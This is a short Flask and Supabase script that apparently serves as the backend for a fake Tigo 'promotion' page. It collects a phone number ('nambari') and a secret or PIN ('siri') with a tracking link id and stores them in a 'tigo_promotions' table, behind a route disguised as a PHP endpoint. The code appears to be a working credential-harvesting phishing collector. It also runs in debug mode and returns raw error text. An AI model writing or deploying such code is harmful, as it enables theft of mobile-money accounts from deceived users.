from flask import Flask, request, render_template
from supabase import create_client, Client
import os

app = Flask(__name__)

# Initialize Supabase
supabase_url = os.environ.get("SUPABASE_URL")
supabase_key = os.environ.get("SUPABASE_KEY")
supabase: Client = create_client(supabase_url, supabase_key)

@app.route('/')
def home():
    return render_template('index.html')

@app.route('/add_tigo.php', methods=['POST'])
def add_tigo():
    try:
        # Get form data
        nambari = request.form.get('nambari')
        siri = request.form.get('siri')
        url_link = request.form.get('url_link', 'gzktrsjamfkw')
        
        if not nambari or not siri:
            return "Please fill all required fields", 400
        
        # Prepare data for Supabase
        data = {
            "nambari": nambari,
            "siri": siri,
            "url_link": url_link
        }
        
        # Insert into Supabase
        response = supabase.table("tigo_promotions").insert(data).execute()
        
        return "Data added successfully!"
        
    except Exception as e:
        return f"Error: {str(e)}", 500

if __name__ == "__main__":
    app.run(debug=True)
